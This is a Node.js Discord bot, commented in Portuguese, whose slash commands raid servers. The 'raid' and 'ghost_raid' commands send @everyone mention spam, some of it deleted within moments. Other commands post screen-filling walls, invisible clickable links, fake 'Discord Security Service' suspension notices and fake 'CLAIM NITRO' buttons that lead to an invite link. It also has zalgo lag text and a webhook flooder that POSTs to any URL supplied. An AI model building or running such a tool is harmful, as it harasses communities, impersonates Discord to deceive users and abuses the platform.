const { 
  Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, 
  EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle 
} = require('discord.js');
const https = require('https');

const INVITE_LINK = "https://discord.gg/ure7pvshFW";
const ALLOWED_USERS = ['1319018100217086022', '1421829036916736040', '1440641528321151099'];
const BOT_TYPE = process.env.BOT_TYPE || 'MAIN';
let botEnabled = (BOT_TYPE === 'MAIN');

// Lógica de Cooldown Dinâmico (Ataque Progressivo)
const dynamicWait = (index) => {
  if (index < 2) return 1000;      // 1-2 msgs: 1s
  if (index < 8) return 1500;      // 3-8 msgs: 1.5s
  return 2000;                     // 9+ msgs: 2s
};

const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

module.exports = async (TOKEN, CLIENT_ID) => {
  const client = new Client({ intents: [GatewayIntentBits.Guilds] });
  const rest = new REST({ version: '10' }).setToken(TOKEN);

  async function registerCommands() {
    const commands = [
      new SlashCommandBuilder().setName(BOT_TYPE === 'MAIN' ? 'bot_mode2' : 'bot_mode').setDescription(`Toggle ${BOT_TYPE}`).setIntegrationTypes([1]).setContexts([0,1,2])
    ];

    if (botEnabled) {
      commands.push(
        new SlashCommandBuilder().setName('raid').setDescription('RAID AGRESSIVA (10x)').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('ghost_raid').setDescription('20x GHOST PING (NOTIFICAÇÃO SEM RASTRO)').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('vertical_nuke').setDescription('OCUPAÇÃO TOTAL DE CHAT').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('interaction_trap').setDescription('PAREDE DE CLIQUES INVISÍVEIS').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('ui_glitch').setDescription('STRESS DE RENDERIZAÇÃO (REVERSE TEXT)').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('fake_system_msg').setDescription('MENSAGEM DE SISTEMA FALSA').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('lag_v2').setDescription('LAG FATAL').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('mention_spam').setDescription('MARCAR TODOS (10x)').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('button_nuke').setDescription('100 BOTÕES').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('embed_flood').setDescription('FLOOD DE CORES').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('fake_update').setDescription('UPDATE FAKE').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('webhook_atk').setDescription('Flood em Webhook').setIntegrationTypes([1]).setContexts([0,1,2])
          .addStringOption(o=>o.setName('url').setRequired(true).setDescription('URL'))
          .addStringOption(o=>o.setName('msg').setRequired(true).setDescription('Texto'))
          .addIntegerOption(o=>o.setName('qtd').setRequired(true).setDescription('Qtd')),
        new SlashCommandBuilder().setName('say').setDescription('Repete').setIntegrationTypes([1]).setContexts([0,1,2])
          .addStringOption(o=>o.setName('t').setRequired(true).setDescription('t'))
          .addIntegerOption(o=>o.setName('q').setRequired(true).setDescription('q'))
      );
    }
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands.map(c => c.toJSON()) }).catch(() => {});
  }

  client.once('ready', () => registerCommands());

  client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    const { commandName, options, user } = interaction;

    if (commandName === 'bot_mode' || commandName === 'bot_mode2') {
      if (!ALLOWED_USERS.includes(user.id)) return interaction.reply({ content: '❌', ephemeral: true });
      if ((BOT_TYPE === 'MAIN' && commandName === 'bot_mode2') || (BOT_TYPE === 'UPDATE' && commandName === 'bot_mode')) {
        botEnabled = !botEnabled;
        await interaction.reply({ content: `✅ **${BOT_TYPE}:** ${botEnabled ? 'ON' : 'OFF'}`, ephemeral: true });
        return registerCommands();
      }
    }

    if (!botEnabled) return;
    await interaction.reply({ content: '☢️', ephemeral: true }).catch(() => {});

    try {
      // 1. GHOST RAID (20x Disparos com auto-delete)
      if (commandName === 'ghost_raid') {
        for(let i=0; i<20; i++) {
          const msg = await interaction.followUp({ content: `@everyone @here **S̶Y̶S̶T̶E̶M̶ ̶B̶R̶E̶A̶C̶H̶**\n${INVITE_LINK}` });
          setTimeout(() => msg.delete().catch(() => {}), 300); // Deleta após 300ms
          await wait(dynamicWait(i));
        }
      }

      // 2. VERTICAL NUKE (Ocupa a tela toda com títulos vazios)
      if (commandName === 'vertical_nuke') {
        const wall = ("# ㅤ\n").repeat(25) + `## **CLEANED BY SP4M_B0T**\n${INVITE_LINK}`;
        await interaction.followUp({ content: wall });
      }

      // 3. INTERACTION TRAP (Parede invisível clicável)
      if (commandName === 'interaction_trap') {
        const trap = (`[ㅤ](${INVITE_LINK})`.repeat(10) + "\n").repeat(10);
        await interaction.followUp({ content: "### ⚠️ **AVISO DE SEGURANÇA**\nClique na área abaixo para validar sua conta:\n" + trap });
      }

      // 4. UI GLITCH (ANSI + Reverse Text + Flashing)
      if (commandName === 'ui_glitch') {
        const reverse = "\u202e" + "KCARH_METSYS_LAICIFO"; // Inverte o texto
        const glitch = ("```ansi\n\u001b[1;31m\u001b[40m" + reverse + "\u001b[0m\n```").repeat(5);
        await interaction.followUp({ content: glitch });
      }

      // 5. FAKE SYSTEM MSG (Imitação de Log de Sistema)
      if (commandName === 'fake_system_msg') {
        const msg = `> ### 🛡️ **𝗗𝗶𝘀𝗰𝗼𝗿𝗱 Security Service**\n> **Detectamos atividades suspeitas na sua conta.**\n> \n> **Ação:** Suspensão Pendente\n> **Resolução:** [Verificar Identidade AGORA](${INVITE_LINK})`;
        await interaction.followUp({ content: msg });
      }

      // --- OUTROS COMANDOS AGRESSIVOS ---
      if (commandName === 'raid') {
        for(let i=0; i<10; i++) {
          await interaction.followUp({ content: `# **CHRIST IS KING**\n-# @everyone @here\nhttps://images-ext-1.discordapp.net/external/wRXhfKv8h9gdaolqa1Qehbxyy9kFLHa13mHHPIW8ubU/https/media.tenor.com/3LGBcIuftUkAAAPo/jesus-edit-edit.mp4\n${INVITE_LINK}` });
          await wait(dynamicWait(i));
        }
      }

      if (commandName === 'lag_v2') {
        const zalgo = "\u030d\u030e\u0304\u0305\u033f\u0311\u0306\u0310\u0352\u035b\u0323\u0324\u0330".repeat(50);
        await interaction.followUp({ content: "```ansi\n\u001b[1;31m" + zalgo + "\n```" });
      }

      if (commandName === 'button_nuke') {
        for (let m = 0; m < 4; m++) {
          const rows = [];
          for (let i = 0; i < 5; i++) {
            const row = new ActionRowBuilder();
            for (let j = 0; j < 5; j++) {
              row.addComponents(new ButtonBuilder().setLabel('🎁 CLAIM NITRO').setStyle(ButtonStyle.Link).setURL(INVITE_LINK));
            }
            rows.push(row);
          }
          await interaction.followUp({ content: "**URGENT GIFT!**", components: rows });
          await wait(dynamicWait(m));
        }
      }

      if (commandName === 'webhook_atk') {
        const url = options.getString('url'), msg = options.getString('msg'), qty = options.getInteger('qtd');
        for (let i = 0; i < qty; i++) {
          const data = JSON.stringify({ content: msg });
          const req = https.request(url, { method: 'POST', headers: { 'Content-Type': 'application/json' } });
          req.write(data); req.end();
          if (i % 5 === 0) await wait(500);
        }
      }

    } catch (err) { console.error("Erro na execução nuclear."); }
  });

  client.login(TOKEN).catch(() => {});
};

process.on('unhandledRejection', () => {});
process.on('uncaughtException', () => {});
